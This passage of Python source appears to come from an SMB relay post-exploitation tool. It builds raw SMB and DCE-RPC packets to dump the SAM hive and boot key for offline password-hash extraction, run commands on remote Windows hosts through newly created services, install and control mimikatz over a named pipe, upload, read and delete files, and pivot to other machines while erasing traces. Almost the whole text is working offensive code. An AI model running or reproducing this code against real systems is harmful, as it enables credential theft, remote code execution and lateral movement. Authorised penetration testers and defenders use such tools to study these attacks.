        head = SMBHeader(cmd="\x25",flag1="\x18", flag2="\x07\xc8",mid="\x09\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
        w = SMBDCEWinRegOpenKey(ContextHandle=ContextHandler,Key=keypath)
        w.calculate()
        x = SMBDCEPacketData(Opnum="\x0f\x00",Data=w)
        x.calculate()
        t = SMBTransDCERPC(FID=f,Data=x)
        t.calculate()
        packet0 = str(head)+str(t)
        buffer1 = longueur(packet0)+packet0
        s.send(buffer1)
        data = s.recv(2048)

        ## DCE/RPC Query Info.
        if data[8:10] == "\x25\x00":
            if data[len(data)-4:] == "\x05\x00\x00\x00":
                print ("[+] Failed to read the key\n")
                return ModifySMBRetCode(data)
            ContextHandler = data[84:104]
            head = SMBHeader(cmd="\x25",flag1="\x18", flag2="\x07\xc8",mid="\x0a\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
            w = SMBDCEWinRegQueryInfoKey(ContextHandle=ContextHandler)
            x = SMBDCEPacketData(Opnum="\x10\x00",Data=w)
            x.calculate()
            t = SMBTransDCERPC(FID=f,Data=x)
            t.calculate()
            packet0 = str(head)+str(t)
            buffer1 = longueur(packet0)+packet0
            s.send(buffer1)
            data = s.recv(2048)
            Value = data[104:120].decode('utf-16le')

        ## DCE/RPC CloseKey.
        if data[8:10] == "\x25\x00":
            if data[len(data)-4:] == "\x05\x00\x00\x00":
                print ("[+] Failed to close the key\n")
                return ModifySMBRetCode(data)
            head = SMBHeader(cmd="\x25",flag1="\x18", flag2="\x07\xc8",mid="\x0a\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
            w = SMBDCEWinRegCloseKey(ContextHandle=ContextHandler)
            x = SMBDCEPacketData(Opnum="\x05\x00",Data=w)
            x.calculate()
            t = SMBTransDCERPC(FID=f,Data=x)
            t.calculate()
            packet0 = str(head)+str(t)
            buffer1 = longueur(packet0)+packet0
            s.send(buffer1)
            data = s.recv(2048)
            return Value, data

def SaveKeyToFile(Filename, Key, handler, f,  data, s):
    ## DCE/RPC WinReg Create Key.
    if data[8:10] == "\x25\x00":
        head = SMBHeader(cmd="\x25",flag1="\x18", flag2="\x07\xc8",mid="\x08\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
        w = SMBDCEWinRegCreateKey(ContextHandle=handler, KeyName = Key)
        w.calculate()
        x = SMBDCEPacketData(Opnum="\x06\x00",Data=w)
        x.calculate()
        t = SMBTransDCERPC(FID=f,Data=x)
        t.calculate()
        packet0 = str(head)+str(t)
        buffer1 = longueur(packet0)+packet0
        s.send(buffer1)
        data = s.recv(2048)

    ## DCE/RPC WinReg Save Key.
    if data[8:10] == "\x25\x00":
        ContextHandler = data[84:104]
        head = SMBHeader(cmd="\x25",flag1="\x18", flag2="\x07\xc8",mid="\x08\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
        w = SMBDCEWinRegSaveKey(ContextHandle=ContextHandler, File=Filename)
        w.calculate()
        x = SMBDCEPacketData(Opnum="\x14\x00",Data=w)
        x.calculate()
        t = SMBTransDCERPC(FID=f,Data=x)
        t.calculate()
        packet0 = str(head)+str(t)
        buffer1 = longueur(packet0)+packet0
        s.send(buffer1)
        data = s.recv(2048)
        return data, s, f


def OpenHKLM(data, s, f):
    ## DCE/RPC WinReg OpenHKLM.
    if data[8:10] == "\x2e\x00":
        head = SMBHeader(cmd="\x25",flag1="\x18", flag2="\x07\xc8",mid="\x08\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
        w = SMBDCEWinRegOpenHKLMKey()
        x = SMBDCEPacketData(Opnum="\x02\x00",Data=w)
        x.calculate()
        t = SMBTransDCERPC(FID=f,Data=x)
        t.calculate()
        packet0 = str(head)+str(t)
        buffer1 = longueur(packet0)+packet0
        s.send(buffer1)
        data = s.recv(2048)
        handler = data[84:104]
        return data, s, handler, f


def OpenHKCU(data, s, f):
    ## DCE/RPC WinReg OpenHKCU.
    if data[8:10] == "\x2e\x00":
        head = SMBHeader(cmd="\x25",flag1="\x18", flag2="\x07\xc8",mid="\x08\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
        w = SMBDCEWinRegOpenHKCUKey()
        x = SMBDCEPacketData(Opnum="\x04\x00",Data=w)
        x.calculate()
        t = SMBTransDCERPC(FID=f,Data=x)
        t.calculate()
        packet0 = str(head)+str(t)
        buffer1 = longueur(packet0)+packet0
        s.send(buffer1)
        data = s.recv(2048)
        handler = data[84:104]
        return data, s, handler, f

def ConvertValuesToBootKey(JDSkew1GBGData):
    Key = ""
    Xored = [0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3, 0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7]
    for i in range(len(JDSkew1GBGData)):
        Key += JDSkew1GBGData[Xored[i]]
    print ('BootKey: %s' % Key.encode("hex"))
    return Key

##########Dump Hashes#############
def DumpHashes(data, s, Host):

    try:
       stopped          = False
       data,s,f         = BindCall("\x01\xd0\x8c\x33\x44\x22\xf1\x31\xaa\xaa\x90\x00\x38\x00\x10\x03", "\x01\x00", "\\winreg", data, s)

       if f == "PipeNotAvailable":
           print ("The Windows Remote Registry Service is sleeping, waking it up...")
           time.sleep(3)
           data,s,f     = BindCall("\x01\xd0\x8c\x33\x44\x22\xf1\x31\xaa\xaa\x90\x00\x38\x00\x10\x03", "\x01\x00", "\\winreg", data, s)

       if f == "PipeNotAvailable":
           print ("Retrying...")
           time.sleep(5)
           data,s,f     = BindCall("\x01\xd0\x8c\x33\x44\x22\xf1\x31\xaa\xaa\x90\x00\x38\x00\x10\x03", "\x01\x00", "\\winreg", data, s)

       if f == "ServiceNotFound":
           stopped = True 
           data,s,f     = BindCall("\x81\xbb\x7a\x36\x44\x98\xf1\x35\xad\x32\x98\xf0\x38\x00\x10\x03", "\x02\x00", "\\svcctl", data, s)
           data,s,f     = StartWinregService(f, Host, data, s)
           data,s       = CloseFID(f, data,s)
           #We should be all good here.
           data,s,f     = BindCall("\x01\xd0\x8c\x33\x44\x22\xf1\x31\xaa\xaa\x90\x00\x38\x00\x10\x03", "\x01\x00", "\\winreg", data, s)

       data,s,handler,f = OpenHKLM(data,s,f)

       ##Error handling.
       if data[8:10] == "\x25\x00":
           if data[len(data)-4:] == "\x05\x00\x00\x00":
               print ("[+] Failed to open Winreg HKLM, is that user a local admin on this host?\n")
               return ModifySMBRetCode(data)
       ##Grab the keys
       if data[8:10] == "\x25\x00":
           JD, data = GrabKeyValue(s, f, handler, data, "SYSTEM\\CurrentControlSet\\Control\\Lsa\\JD")
           Skew1, data = GrabKeyValue(s, f, handler, data, "SYSTEM\\CurrentControlSet\\Control\\Lsa\\Skew1")
           Data, data = GrabKeyValue(s, f, handler, data, "SYSTEM\\CurrentControlSet\\Control\\Lsa\\Data")
           GBG, data = GrabKeyValue(s, f, handler, data, "SYSTEM\\CurrentControlSet\\Control\\Lsa\\GBG")

       #Dump bootkey, then finish up.
       BootKey       = ConvertValuesToBootKey(str(JD+Skew1+GBG+Data).decode("hex"))
       RandomFile    = ''.join([random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ') for i in range(6)])+'.tmp'
       data,s,f      = SaveKeyToFile("C:\\Windows\\Temp\\"+RandomFile, "SAM", handler, f, data, s)
       data,s        = CloseFID(f, data, s)
       data,s,f      = SMBOpenFile("\\Windows\\Temp\\"+RandomFile, "C", Host, RW, data, s)
       data,s,Output = ReadAndDelete(f, "\\Windows\\Temp\\"+RandomFile, data, s)

       #If the service was stopped before we came...
       if stopped:
           data,s       = SMBOpenPipe(Host, data, s)#Get a new IPC$ TID.
           data,s,f     = BindCall("\x81\xbb\x7a\x36\x44\x98\xf1\x35\xad\x32\x98\xf0\x38\x00\x10\x03", "\x02\x00", "\\svcctl", data, s)
           data,s,f     = StopWinregService(f, Host, data, s)
           data,s       = CloseFID(f, data,s)
           data         = ModifySMBRetCode(data)

       #After everything has been cleaned up, we write to file and call creddump
       WriteOutputToFile(Output, "./Sam-"+Host+".tmp")
       try:
           Hashes = dump_file_hashes(BootKey, SaveSam_Path+"./Sam-"+Host+".tmp")
           WriteOutputToFile(Hashes, "./Hash-Dump-"+Host+".txt")
       except:
           print ("[+] Live dump failed, is python-crypto installed? ")
           pass
       print ("[+] The SAM file was saved in: ./relay-dumps/Sam-"+Host+".tmp and the hashes in ./relay-dumps/Hash-Dumped-"+Host+".txt")
       return data

    except:
       #Don't loose this connection because something went wrong, it's a good one. Hashdump might fail, while command works.
       print ("[+] Something went wrong, try something else.")
       return ModifySMBRetCode(data)

##########Save An HKLM Key And Its Subkeys#############
def SaveAKey(data, s, Host, Key):

    try:
       stopped          = False
       data,s,f         = BindCall("\x01\xd0\x8c\x33\x44\x22\xf1\x31\xaa\xaa\x90\x00\x38\x00\x10\x03", "\x01\x00", "\\winreg", data, s)

       if f == "PipeNotAvailable":
           print ("The Windows Remote Registry Service is sleeping, waking it up...")
           time.sleep(3)
           data,s,f     = BindCall("\x01\xd0\x8c\x33\x44\x22\xf1\x31\xaa\xaa\x90\x00\x38\x00\x10\x03", "\x01\x00", "\\winreg", data, s)

       if f == "PipeNotAvailable":
           print ("Retrying...")
           time.sleep(5)
           data,s,f     = BindCall("\x01\xd0\x8c\x33\x44\x22\xf1\x31\xaa\xaa\x90\x00\x38\x00\x10\x03", "\x01\x00", "\\winreg", data, s)

       if f == "ServiceNotFound":
           stopped = True 
           data,s,f     = BindCall("\x81\xbb\x7a\x36\x44\x98\xf1\x35\xad\x32\x98\xf0\x38\x00\x10\x03", "\x02\x00", "\\svcctl", data, s)
           data,s,f     = StartWinregService(f, Host, data, s)
           data,s       = CloseFID(f, data,s)
           #We should be all good here.
           data,s,f     = BindCall("\x01\xd0\x8c\x33\x44\x22\xf1\x31\xaa\xaa\x90\x00\x38\x00\x10\x03", "\x01\x00", "\\winreg", data, s)

       ##Error handling.
       if data[8:10] == "\x25\x00":
           if data[len(data)-4:] == "\x05\x00\x00\x00":
               print ("[+] Failed to open Winreg HKLM, is that user a local admin on this host?\n")
               return ModifySMBRetCode(data)

       data,s,handler,f = OpenHKLM(data,s,f)

       data,s,f      = SaveKeyToFile("C:\\Windows\\Temp\\"+Key+".tmp", Key, handler, f, data, s)
       if data[8:10] != "\x25\x00":
          print ("[+] Something went wrong, try something else.")
          return ModifySMBRetCode(data)
       data,s        = CloseFID(f, data, s)
       data,s,f      = SMBOpenFile("\\Windows\\Temp\\"+Key+".tmp", "C", Host, RW, data, s)
       data,s,Output = ReadAndDelete(f, "\\Windows\\Temp\\"+Key+".tmp", data, s)

       #If the service was stopped before we came...
       if stopped:
           data,s       = SMBOpenPipe(Host, data, s)#Get a new IPC$ TID.
           data,s,f     = BindCall("\x81\xbb\x7a\x36\x44\x98\xf1\x35\xad\x32\x98\xf0\x38\x00\x10\x03", "\x02\x00", "\\svcctl", data, s)
           data,s,f     = StopWinregService(f, Host, data, s)
           data,s       = CloseFID(f, data,s)
           data         = ModifySMBRetCode(data)

       #After everything has been cleaned up, we write the output to a file.
       WriteOutputToFile(Output, Host+"-"+Key+".tmp")
       print ("[+] The "+Key+" key and its subkeys were saved in: ./relay-dumps/"+Host+"-"+Key+".tmp")
       return data

    except:
       #Don't loose this connection because something went wrong, it's a good one. Hashdump might fail, while command works.
       print ("[+] Something went wrong, try something else.")
       return ModifySMBRetCode(data)

##########ReadAFile#############
def ReadFile(data, s, File, Host):
    try:
       File = File.replace("/","\\")
       data,s,f      = SMBOpenFile(File, "C", Host, READ, data, s)
       data,s,Output = GrabAndRead(f, File, data, s)
       print (Output)
       return ModifySMBRetCode(data) ##Command was successful, ret true.

    except:
       print ("[+] Read failed. Remote filename was typed correctly?")
       return ModifySMBRetCode(data) ##Don't ditch the connection because something went wrong.

def GetAfFile(data, s, File, Host):
    try:
       File = File.replace("/","\\")
       data,s,f      = SMBOpenFile(File, "C", Host, READ, data, s)
       data,s,Output = GrabAndRead(f, File, data, s)
       WriteOutputToFile(Output, Host+"-"+File)
       print ("[+] Done.")
       return ModifySMBRetCode(data) ##Command was successful, ret true.

    except:
       print ("[+] Get file failed. Remote filename was typed correctly?")
       return ModifySMBRetCode(data) ##Don't ditch the connection because something went wrong.

##########UploadAFile#############
def WriteFile(data, s, File,  FileSize, FileContent, Host):
    try:
       File          = File.replace("/","\\")
       data,s,f      = SMBOpenFileForWriting(File, FileSize, FileContent, "C", Host, RW, data, s)
       data,s        = UploadAndWrite(f, FileSize, FileContent, data, s)
       return ModifySMBRetCode(data) ##Command was successful, ret true.

    except:
       print ("[+] Write failed.")
       return ModifySMBRetCode(data) ##Don't ditch the connection because something went wrong.

##########DeleteAFile############
def DeleteFile(data, s, File, Host):
    try:
       File          = File.replace("/","\\")
       data,s        = DeleteAFile(File, data, s, Host)
       data,s        = CloseTID(data, s)
       return        ModifySMBRetCode(data) ##Command was successful, ret true.
    except:
       print ("[+] Delete operation failed.\n[+] Something went wrong.")
       data,s        = CloseTID(data, s)
       return        ModifySMBRetCode(data) ##Don't ditch the connection because something went wrong.

##########Psexec#############
def RunCmd(data, s, clientIP, Username, Domain, Command, Logs, Host, RunPath, FileName):

    try:
       RandomFName      = GenerateRandomFileName()
       WinTmpPath       = "%windir%\\Temp\\"+RandomFName+".txt"
       LogFile          = "\\Windows\\Temp\\"+RandomFName+".txt"
       Command          = RunPath+" \""+Command+"\" \""+WinTmpPath+"\""
       ServiceNameChars = GenerateServiceName()
       ServiceIDChars   = GenerateServiceID()

       data,s           = SMBOpenPipe(Host, data, s)
       data,s,f         = BindCall("\x81\xbb\x7a\x36\x44\x98\xf1\x35\xad\x32\x98\xf0\x38\x00\x10\x03", "\x02\x00", "\\svcctl", data, s)
       data,s,f         = CreateService(Command, ServiceNameChars, ServiceIDChars, f, Host, data, s)
       data,s           = CloseFID(f, data,s)
       time.sleep(1)
       data,s,f         = SMBOpenFile(LogFile, "C", Host, RW, data, s)
       data,s,Output    = ReadAndDelete(f, LogFile, data, s)
       print (Output)
       data             = DeleteFile(data, s, "\\Windows\\Temp\\"+FileName, Host)

       Logs.info('Command executed:')
       Logs.info(clientIP+","+Username+','+Command)      

       return data

    except:
       #Don't loose this connection because something went wrong, it's a good one. Commands might fail, while hashdump works.
       print ("[+] Something went wrong, try something else.")
       return ModifySMBRetCode(data)

##########Runas#############
def RunAsCmd(data, s, clientIP, Username, Domain, Command, Logs, Host, FileName):

    try:
       Command          = Command.replace('"', '\'')
       RandomFName      = GenerateRandomFileName()
       WinTmpPath       = "%windir%\\Temp\\"+RandomFName+".txt"
       LogFile          = "\\Windows\\Temp\\"+RandomFName+".txt"
       Command          = "%windir%\\Temp\\"+FileName+" \""+Command+"\" \""+WinTmpPath+"\""
       ServiceNameChars = GenerateServiceName()
       ServiceIDChars   = GenerateServiceID()

       data,s           = SMBOpenPipe(Host, data, s)
       data,s,f         = BindCall("\x81\xbb\x7a\x36\x44\x98\xf1\x35\xad\x32\x98\xf0\x38\x00\x10\x03", "\x02\x00", "\\svcctl", data, s)
       data,s,f         = CreateService(Command, ServiceNameChars, ServiceIDChars, f, Host, data, s)
       data,s           = CloseFID(f, data,s)
       time.sleep(1)
       data,s,f         = SMBOpenFile( LogFile, "C", Host, RW, data, s)
       data,s,Output    = ReadAndDelete(f, LogFile, data, s)
       print (Output)
       data             = DeleteFile(data, s, "\\Windows\\Temp\\"+FileName, Host)

       Logs.info('Command executed:')
       Logs.info(clientIP+","+Username+','+Command)      
       return data

    except:
       data             = DeleteFile(data, s, "\\Windows\\Temp\\"+FileName, Host)
       #Don't loose this connection because something went wrong, it's a good one. Commands might fail, while hashdump works.
       print ("[+] Something went wrong, try something else.")
       return ModifySMBRetCode(data)

##########MimiKatz RPC#############
def InstallMimiKatz(data, s, clientIP, Username, Domain, Command, Logs, Host, FileName):
    global MimiKatzSVCID
    global MimiKatzSVCName
    try:
       DisplayGUID, DisplayGUIDle = Generateuuid()
       NamedPipe        = GenerateNamedPipeName()
       RandomFName      = GenerateRandomFileName()
       WinTmpPath       = "%windir%\\Temp\\"+RandomFName+".txt"
       #Install mimikatz as a service.
       Command          = "c:\\Windows\\Temp\\"+FileName+" \"rpc::server /protseq:ncacn_np /endpoint:\pipe\\"+NamedPipe+" /guid:{"+DisplayGUID+"} /noreg\" service::me exit"
       MimiKatzSVCName  = GenerateServiceName()
       MimiKatzSVCID    = GenerateServiceID()

       data,s           = SMBOpenPipe(Host, data, s)
       data,s,f         = BindCall("\x81\xbb\x7a\x36\x44\x98\xf1\x35\xad\x32\x98\xf0\x38\x00\x10\x03", "\x02\x00", "\\svcctl", data, s)
       data,s,f         = CreateMimikatzService(Command,  MimiKatzSVCName, MimiKatzSVCID, f, Host, data, s)
       data,s           = CloseFID(f, data,s)

       Logs.info('Command executed:')
       Logs.info(clientIP+","+Username+','+Command)      

       return data, DisplayGUIDle, NamedPipe

    except:
       #Don't loose this connection because something went wrong, it's a good one. Commands might fail, while hashdump works.
       print ("[+] Something went wrong, try something else.")
       return ModifySMBRetCode(data)

def RunMimiCmd(data, s, clientIP, Username, Domain, Command, Logs, Host, FileName):
    try:
       data,guid,namedpipe    = InstallMimiKatz(data, s, clientIP, Username, Domain, Command, Logs, Host, FileName)
       data,s                 = SMBOpenPipe(Host, data, s)
       ##Wait for the pipe to come up..
       time.sleep(1)

       data,s,f               = BindCall(guid, "\x01\x00", "\\"+namedpipe, data, s)
       data,s,f               = MimiKatzRPC(Command, f, Host, data, s)
       data,s                 = SMBDCERPCCloseFID(f, data,s)
       #####
       #Kill the SVC now... Never know when the user will leave, so lets not leave anything on the target.
       data,s           = SMBOpenPipe(Host, data, s)
       data,s,f         = BindCall("\x81\xbb\x7a\x36\x44\x98\xf1\x35\xad\x32\x98\xf0\x38\x00\x10\x03", "\x02\x00", "\\svcctl", data, s)
       data,s,f         = StopAndDeleteService(Command,  MimiKatzSVCName, MimiKatzSVCID, f, Host, data, s)
       data,s           = CloseFID(f, data,s)
       #Short sleep, to make sure the service had the time needed to stop before deleting mimikatz
       time.sleep(0.5)
       data             = DeleteFile(data, s, "\\Windows\\Temp\\"+FileName, Host)

       Logs.info('Command executed:')
       Logs.info(clientIP+","+Username+','+Command)      

       return ModifySMBRetCode(data)
    except:
       #Don't loose this connection because something went wrong, it's a good one. Commands might fail, while hashdump works.
       print ("[+] Something went wrong while calling mimikatz. Maybe it's a 32bits system? Try mimi32.")
       return ModifySMBRetCode(data)

##########Pivot#############
def PivotToOtherHost(data, s, clientIP, Username, Domain, Logs, Host, RunAsPath, RunAsFileName):

    try:
       LocalIp          = FindLocalIp()
       WinTmpPath       = "%windir%\\Temp\\log.txt"
       Command          = RunAsPath+" \"net view \\\\"+LocalIp+"\" \""+WinTmpPath+"\""
       ServiceNameChars = GenerateServiceName()
       ServiceIDChars   = GenerateServiceID()

       data,s           = SMBOpenPipe(Host, data, s)
       data,s,f         = BindCall("\x81\xbb\x7a\x36\x44\x98\xf1\x35\xad\x32\x98\xf0\x38\x00\x10\x03", "\x02\x00", "\\svcctl", data, s)
       data,s,f         = CreateService(Command, ServiceNameChars, ServiceIDChars, f, Host, data, s)
       data,s           = CloseFID(f, data,s)

       ## We're leaving this host, clean it up..
       time.sleep(1.5)
       data             = DeleteFile(data, s, "\\Windows\\Temp\\"+RunAsFileName, Host)
       Logs.info('Command executed:')
       Logs.info(clientIP+","+Username+','+Command)      
       return data

    except:
       #Don't loose this connection because something went wrong, it's a good one. Commands might fail, while hashdump works.
       print ("[+] Something went wrong, try something else.")
       return ModifySMBRetCode(data)

##########VerifyPivot#############
def VerifyPivot(data, s, clientIP, Username, Domain, Pivot, Logs, Host, RunAsPath, RunAsFileName):

    try:
       RandomFName      = GenerateRandomFileName()
       ServiceNameChars = GenerateServiceName()
       ServiceIDChars   = GenerateServiceID()
       WinTmpPath       = "%windir%\\Temp\\"+RandomFName+".txt"
       LogFile          = "\\Windows\\Temp\\"+RandomFName+".txt"
       Command          = RunAsPath+" \"dir \\\\"+Pivot+"\\C$\" \""+WinTmpPath+"\""

       data,s           = SMBOpenPipe(Host, data, s)
       data,s,f         = BindCall("\x81\xbb\x7a\x36\x44\x98\xf1\x35\xad\x32\x98\xf0\x38\x00\x10\x03", "\x02\x00", "\\svcctl", data, s)
       data,s,f         = CreateService(Command, ServiceNameChars, ServiceIDChars, f, Host, data, s)
       data,s           = CloseFID(f, data,s)
       data,s,f         = SMBOpenFile(LogFile, "C", Host, RW, data, s)
       data,s,Output    = ReadAndDelete(f, LogFile, data, s)
       data             = DeleteFile(data, s, "\\Windows\\Temp\\"+RunAsFileName, Host)

       Logs.info('Command executed:')
       Logs.info(clientIP+","+Username+','+Command)

       if re.findall('Volume in drive', Output):
          return True, data
       else:
          return False, data     

    except:
       #Don't loose this connection because something went wrong, it's a good one. Commands might fail, while hashdump works.
       print ("[+] Something went wrong, try something else.")
       return ModifySMBRetCode(data)

##########DoSomethingDumb#############
def DumbSMBChain(data, s, Host):
    try:
       File          = "/Windows/win.ini"
       File          = File.replace("/","\\")
       data,s,f      = SMBOpenFile(File, "C", Host, READ, data, s)
       data,s,Output = GrabAndRead(f, File, data, s)
       data, s       = CloseTID(data, s)
       return ModifySMBRetCode(data) ##Command was successful, ret true.

    except:
       return ModifySMBRetCode(data) ##Don't ditch the connection because something went wrong.

